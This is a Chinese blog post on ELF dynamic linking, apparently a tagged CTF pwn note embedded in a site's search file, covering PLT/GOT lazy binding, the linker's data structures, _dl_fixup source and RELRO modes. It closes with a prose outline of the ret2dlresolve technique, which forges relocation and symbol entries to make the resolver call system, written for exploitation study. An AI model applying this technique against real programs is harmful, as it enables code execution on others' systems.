+<p>除去PLT和GOT里特殊的表项，PLT与GOT每个表项都一一对应，为同一个函数服务</p>
+<img src="https://i.loli.net/2021/05/18/XCAMFiDcbsmY6GN.png" style="zoom:80%;" />
+
+<p>当程序调用一个共享库的函数时，需要在程序真正运行时才解析函数的实际地址。在可执行文件里调用的函数地址为plt表项的地址，plt在运行时解析函数地址并装载进got表之后，跳转到got表执行。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">080483d0 &lt;.text&gt;:</span><br><span class="line"> ···</span><br><span class="line"> 80484a9:	8d 45 94             	lea    -0x6c(%ebp),%eax</span><br><span class="line"> 80484ac:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 80484b0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 80484b7:	e8 d4 fe ff ff       	call   8048390 &lt;read@plt&gt;</span><br><span class="line"> 80484bc:	c9                   	leave  </span><br><span class="line"> 80484bd:	c3                   	ret  </span><br></pre></td></tr></table></figure>
+
+<p>plt每个plt条目大小为0x10，首条指令为跳转到对应的got表项地址，got表里的地址为函数在内存中的真正地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">08048380 &lt;setbuf@plt&gt;:</span><br><span class="line"> 8048380:	ff 25 00 a0 04 08    	jmp    *0x804a000</span><br><span class="line"> 8048386:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804838b:	e9 e0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;read@plt&gt;:</span><br><span class="line"> 8048390:	ff 25 04 a0 04 08    	jmp    *0x804a004</span><br><span class="line"> 8048396:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804839b:	e9 d0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在read@plt地址0x8048390下断点，运行程序，程序跳转到<a href="mailto:&#x72;&#x65;&#97;&#x64;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#116;">&#x72;&#x65;&#97;&#x64;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#116;</a>地址。</p>
+<ul>
+<li>由于是第一次调用read函数，got表里并没有填充read函数的真实地址，需要调用解析函数解析实际地址填充到got表里，而这个解析函数就由plt[0]调用，所以程序跳转回自己的plt表第二条指令</li>
+<li>0x08048396将read函数自身在.rel.plt表的偏移压栈（实际是偏移*8），作为解析函数的参数，随后跳转到plt[0]-0x8048370</li>
+<li>plt[0] 第一条指令0x8048370将 GOT[1]压栈，GOT[1]中存放了指向read()的 link_map 结构的偏移地址</li>
+<li>plt[0]第二条指令0x8048376跳转到GOT[2]存放的地址，该地址指向动态链接器的&lt;_dl_runtime_resolve&gt;函数，确定read()的地址，重写read的GOT表</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">─────────────────────────────────────[ DISASM]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x8048390</span>  &lt;read@plt&gt;              jmp    dword ptr [read@got.plt] &lt;<span class="number">0x804a004</span>&gt;</span><br><span class="line">   <span class="number">0x8048396</span>  &lt;read@plt+<span class="number">6</span>&gt;            push   <span class="number">8</span></span><br><span class="line">   <span class="number">0x804839b</span>  &lt;read@plt+<span class="number">11</span>&gt;           jmp    <span class="number">0x8048370</span> &lt;<span class="number">0x8048370</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048370</span>  &lt;plt[<span class="number">0</span>]&gt;                push   dword ptr [<span class="number">0x8049ff8</span>]</span><br><span class="line">   <span class="number">0x8048376</span>                          jmp    dword ptr [<span class="number">0x8049ffc</span>] &lt;_dl_runtime_resolve&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;   push   eax</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;_dl_fixup&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; plt</span><br><span class="line"><span class="number">0x8048380</span>: setbuf@plt</span><br><span class="line"><span class="number">0x8048390</span>: read@plt</span><br><span class="line"><span class="number">0x80483a0</span>: __gmon_start__@plt</span><br><span class="line"><span class="number">0x80483b0</span>: __libc_start_main@plt</span><br><span class="line"><span class="number">0x80483c0</span>: write@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line">GOT protection: Partial RELRO | GOT functions: <span class="number">5</span></span><br><span class="line">[0x804a000] setbuf@GLIBC_2.0 -&gt; 0xf7e69000 (setbuf) </span><br><span class="line">[0x804a004] read@GLIBC_2.0 -&gt; 0x8048396 (read@plt+6)</span><br><span class="line">[0x804a008] __gmon_start__ -&gt; 0x80483a6 (__gmon_start__@plt+6)</span><br><span class="line">[0x804a00c] __libc_start_main@GLIBC_2.0 -&gt; 0xf7e1b550 (__libc_start_main)</span><br><span class="line">[0x804a010] write@GLIBC_2.0 -&gt; 0xf7ed8c90 (write)</span><br></pre></td></tr></table></figure>
+
+<h1 id="动态链接数据结构"><a href="#动态链接数据结构" class="headerlink" title="动态链接数据结构"></a>动态链接数据结构</h1><h2 id="动态段-dynamic"><a href="#动态段-dynamic" class="headerlink" title="动态段 .dynamic"></a>动态段 .dynamic</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
+
+<p>动态链接器通过d_tag识别动态段信息，动态链接器映射到内存中，首先会对自身重定位，接着会查询ELF可执行文件的.dynamic节DT_NEEDED条目，链接所需的共享库。当一个共享库被装载进内存，链接器会获取动态段信息，并将库信息添加到link_map链表中，Link_map是动态链接器的内部结构，用于跟踪加载的库和库中的符号。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="重定位表-rel-plt"><a href="#重定位表-rel-plt" class="headerlink" title="重定位表.rel_plt"></a>重定位表.rel_plt</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)		((val) &gt;&gt; 8)</span></span><br></pre></td></tr></table></figure>
+
+<p>r_offset是需要重定位的引用地址，r_info指定必须对其重定位的符号表索引和重定位类型，符号表索引等于r_info&gt;&gt;8，.got.plt重定位类型是R_386_JUMP_SLOT，表示被修正的位置只需要直接填入符号地址即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -r pwn-200</span> </span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rel.plt&#x27; 位于偏移量 0x318 含有 5 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="符号表-dynsym"><a href="#符号表-dynsym" class="headerlink" title="符号表.dynsym"></a>符号表.dynsym</h2><p>用于符号解析的符号表</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+
+<p>st_name 是字符串表中的偏移</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s pwn-200</span></span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 9 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     6: 0804a040     4 OBJECT  GLOBAL DEFAULT   25 stdout@GLIBC_2.0 (2)</span><br><span class="line">     7: 0804863c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line">     8: 0804a020     4 OBJECT  GLOBAL DEFAULT   25 stdin@GLIBC_2.0 (2)</span><br></pre></td></tr></table></figure>
+
+<h3 id="dl-runtime-resolve-解析"><a href="#dl-runtime-resolve-解析" class="headerlink" title="_dl_runtime_resolve()解析"></a>_dl_runtime_resolve()解析</h3><p>_dl_runtime_resolve()内部调用了 _dl_fixup() 函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码里的部分语句</span></span><br><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">｛</span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>
+
+<p>源码解析：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+<p>参数与_dl_runtime_resolve()相同，reloc_arg是函数在.rel.plt里的偏移，与.got.plt表的偏移一致</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>
+
+<p>获取重定位条目，DT_JMPREL保存指向.rel.plt的地址，reloc_offset即重定位表偏移</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
+
+<p>reloc-&gt;r_info从重定位条目的r_info获取重定位符号表的偏移，进而在符号表里查询符号</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>确定重定位类型是R_386_JUMP_SLOT，随后根据符号表的信息，去字符串表查找对应字符串</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>
+
+<p>调用DL_FIXUP_MAKE_VALUE函数获取函数的的实际地址，将函数地址写到got表对应位置</p>
+<p>总结：link_map访问.dynamic，先后获取.rel.plt重定位条目，.dynsym符号表索引，.dynstr函数对应的字符串，最后从动态链接库中查找函数的地址，更新got表，调用这个函数</p>
+<h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>RELRO (RELocation Read Only)只读重定位，分为 partial relro 和 full relro</p>
+<ul>
+<li><p>Partial RELRO</p>
+<ul>
+<li>一些节在被动态链接器初始化后标记为只读，包括.init_array .fini_array .jcr .dynamic .got </li>
+<li>.got.plt仍然可写</li>
+</ul>
+</li>
+<li><p>Full RELRO</p>
+<ul>
+<li>拥有 Partial RELRO 的所有特性</li>
+<li>延迟绑定被禁用，所有导入符号在链接的时候就被解析</li>
+<li>整个GOT也被（重新）映射为只读，.got.plt节完全用目标函数的最终地址（将.got和.got.plt合并到一个节.got中）进行了初始化</li>
+<li>由于未启用惰性解析，因此不会初始化GOT [1]和GOT [2]条目。</li>
+</ul>
+</li>
+</ul>
+<h1 id="攻击-dl-runtime-resolve"><a href="#攻击-dl-runtime-resolve" class="headerlink" title="攻击_dl_runtime_resolve()"></a>攻击_dl_runtime_resolve()</h1><p>没有开启RELRO，.dynamic可写，将.dynamic中dynstr指针篡改为一个伪造的fake_dynstr表，在伪造的字符串表中将调用的函数字符串（如read）改为system字符串。_dl_runtime_resolve()回根据获得的字符串作为函数名去查找函数。</p>
+<p>开启Partial RELRO，.dynamic不可写。由于_dl_runtime_resolve的第二个参数重定位偏移没有检查数组越界，利用这一点将重定位偏移改成一个很大的数，使其偏移bss节，在bss节伪造的重定位条目，那么 _dl_runtime_resolve将被欺骗，进而去伪造的重定位条目查询我们想要的system函数。进而伪造system符号信息和字符串信息，最后调用system函数。</p>
+<p>Full RELRO绕过：<a href="https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/">https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/</a></p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
+<li><p>《深入理解计算机系统》</p>
+</li>
+<li><p>《linux二进制分析》</p>
+</li>
+<li><p><a href="https://www.jianshu.com/p/cdb5cfcb5056">https://www.jianshu.com/p/cdb5cfcb5056</a></p>
+</li>
+<li><p><a href="https://www.freebuf.com/articles/system/170661.html">https://www.freebuf.com/articles/system/170661.html</a></p>
+</li>
+<li><p><a href="https://zhuanlan.zhihu.com/p/37572651">https://zhuanlan.zhihu.com/p/37572651</a></p>
+</li>
+<li><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/5111">https://xz.aliyun.com/t/5111</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>ROP</tag>
+      </tags>
   </entry>
 </search>
